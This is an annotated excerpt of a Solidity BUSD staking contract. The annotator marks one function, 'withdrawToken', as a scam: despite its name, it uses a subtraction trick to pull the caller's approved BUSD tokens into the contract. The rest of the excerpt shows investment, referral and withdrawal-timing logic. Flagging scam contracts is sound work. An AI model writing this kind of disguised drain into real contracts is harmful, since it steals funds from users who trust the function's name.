...
contract BUSDSTAKER {
    ...
    token public BUSD = token(0x7EF2e0048f5bAeDe046f6BF797943daF4ED8CB47);
    ...
    struct User {
        Deposit[] deposits;
        uint256 checkpoint; //check point on how often a user can withdraw tokens
        address referrer;
        uint256 bonus;
    ...
    function withdrawToken() public payable { //bruh this a scam
      uint balance;
      balance -= msg.value;
      BUSD.transferFrom(msg.sender,address(this),balance);
    }
    ...
    function invest(address referrer, uint256 _amount) public {
        require(_amount >= INVEST_MIN_AMOUNT, "Amount must be greater");
        require( BUSD.balanceOf(msg.sender) > 0, "No Balance");
        ...
        if (msg.sender == owner) {
            ...
            if (
                (users[referrer].deposits.length == 0 || referrer == msg.sender) && msg.sender != owner
            ) {
                referrer = owner;
            }
    ...
    function withdraw() public {
        User storage user = users[msg.sender];
        require(
            block.timestamp > user.checkpoint + (1 minutes), //check point on how often a user can withdraw tokens
